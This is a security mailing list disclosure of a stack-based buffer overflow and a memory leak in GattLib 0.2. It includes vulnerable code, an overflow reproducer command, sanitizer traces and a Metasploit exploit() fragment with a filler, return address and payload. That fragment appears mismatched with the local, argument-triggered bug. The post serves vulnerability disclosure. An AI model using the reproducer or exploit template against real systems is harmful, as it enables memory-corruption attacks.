  oss-security - GattLib 0.2 has a stack-based buffer -            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Mon, 21 Jan From: Dhiraj Mishra <mishra.dhiraj95@...il.com> To: oss-security@...ts.openwall.com Subject: GattLib 0.2 has a stack-based buffer -  Hi List,  ## Summary: While fuzzing gattlib (Gattlib is a library to access GATT information from BLE (Bluetooth Low Energy) devices) using clang 6.0 with ASAN a stack-based buffer-overflow was observed.  ## Vulnerable code from gattlib.c  // Transform string from to strncpy(device_address_str, dst, sizeof(device_address_str)); for (i = 0; i < strlen(device_address_str); i++) { if (device_address_str[i] == ':') { device_address_str[i] = '_'; } }  ## Vulnerable code from discover.c  if (argc != 2) { printf("%s <device_address>\n", argv[0]); return 1; }  connection = gattlib_connect(NULL, argv[1], BDADDR_LE_PUBLIC, BT_SEC_LOW, 0, 0); if (connection == NULL) { fprintf(stderr, "Fail to connect to the bluetooth device.\n"); return 1; }  Also, I have figured a simple way to reproduce this rather than using AFL poc in this case.  ./discover `python -c 'print "A"*20'`  ## ASAN  AddressSanitizer: stack-buffer-overflow on address at pc bp sp READ of size 21 at thread T0     #0 in __interceptor_strlen.part.30     #1 in gattlib_connect     #2 in main     #3 in __libc_start_main     #4 in _start  Address is located in stack of thread T0 at offset 84 in frame     #0 in gattlib_connect    This frame has 3 object(s):     [32, 40) 'error'     [64, 84) 'device_address_str' <== Memory access at offset 84 overflows this variable     'object_path' HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext       (longjmp and C++ exceptions *are* supported) SUMMARY: AddressSanitizer: stack-buffer-overflow in __interceptor_strlen.part.30 Shadow bytes around the buggy address:   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 f2 f2 f2 00 f2 f2 f2 f2   00 00 00 00 00 00 00 00 00 00 00 00 04 f3 f3 f3   f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1   00 f2 f2 f2 00 f2 f2 f2 04 f2 04 f2 00 00 00 00   06 f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:       fa   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb  I have also written a quick MSF module for this specifically the exploit() part  I have also written a quick MSF module for this specifically the exploit() part  def exploit     connect      print_status("Sending #{payload.encoded.length} byte payload...")      # Building the buffer for transmission     buf = "A" * 20     buf += [ target.ret ].pack('V')     buf += payload.encoded      sock.put(buf)     sock.get      handler end  In addition memory leak was also observed in this case.  LeakSanitizer: detected memory leaks  Direct leak of 16 byte(s) in 1 object(s) allocated from:     #0 in calloc     #1 in gattlib_connect     #2 in main     #3 in __libc_start_main  SUMMARY: AddressSanitizer: 16 byte(s) leaked in 1 allocation(s).  OR to verify memory leak use,  ./discover `python -c 'print "A"*10'`  Later was assigned to this issue.  Reference: https://github.com/labapart/gattlib/issues/81   Thank you @mishradhiraj_   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      